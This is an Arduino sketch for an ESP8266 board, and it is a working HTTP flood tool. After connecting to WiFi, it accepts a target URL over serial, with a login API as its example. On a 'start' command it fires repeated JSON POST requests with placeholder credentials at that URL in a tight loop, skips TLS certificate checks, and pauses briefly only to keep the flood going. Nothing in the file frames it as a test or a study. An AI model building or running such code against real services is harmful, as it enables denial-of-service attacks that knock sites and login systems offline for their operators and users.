#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>

const char* ssid = "WiFi-NAME";  
const char* password = "WiFi-PASSWORD";  

String target_url = "";  
bool floodActive = false;  
int requestCount = 0;
unsigned long startMillis;
unsigned long cooldownMillis = 0;

void connectWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);
  Serial.print("Connecting to WiFi...");
  
  int timeout = 20;
  while (WiFi.status() != WL_CONNECTED && timeout > 0) {
    delay(500);
    Serial.print(".");
    timeout--;
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nConnected!");
    Serial.print("Device IP: ");
    Serial.println(WiFi.localIP());
    Serial.println("Enter target URL (Example: https://site.com/api/login)");
  } else {
    Serial.println("\nWiFi connection failed.");
  }
}

void sendFloodRequest() {
  if (WiFi.status() != WL_CONNECTED) {
    Serial.println("WiFi Disconnected!");
    return;
  }

  if (target_url == "") {
    Serial.println("Target URL not set!");
    return;
  }

  WiFiClientSecure client;
  HTTPClient http;
  client.setInsecure();  
  http.begin(client, target_url);
  http.addHeader("Content-Type", "application/json");

  String username = "test2";
  String password = "test1";
  String payload = "{\"username\": \"" + username + "\", \"password\": \"" + password + "\"}";

  int httpResponseCode = http.POST(payload);

  if (httpResponseCode > 0) {
    requestCount++;
    Serial.print("Request Sent: ");
    Serial.print(username);
    Serial.print(" / ");
    Serial.print(password);
    Serial.print("  Response: ");
    Serial.println(httpResponseCode);
  } else {
    Serial.println("Request Failed.");
  }

  http.end();
}

void setup() {
  Serial.begin(115200);
  connectWiFi();
}

void loop() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();

    if (command.startsWith("url ")) {
      target_url = command.substring(4);
      Serial.print("Target URL Set: ");
      Serial.println(target_url);
    } else if (command == "start") {
      if (target_url == "") {
        Serial.println("Set target URL first: 'url https://example.com/api/login'");
      } else {
        floodActive = true;
        requestCount = 0;
        startMillis = millis();
        cooldownMillis = 0;
        Serial.println("Flood Started.");
      }
    } else if (command == "stop") {
      floodActive = false;
      Serial.println("Flood Stopped.");
    }
  }

  if (floodActive) {
    if (millis() - cooldownMillis >= 10000) {
      if (requestCount >= 1000) {
        Serial.println("Device overheating. Cooling down for 5 seconds.");
        delay(5000);  
      }
      requestCount = 0;
      cooldownMillis = millis();
    }

    for (int i = 0; i < 10; i++) {
      sendFloodRequest();
      delay(1);  
    }
  }
}
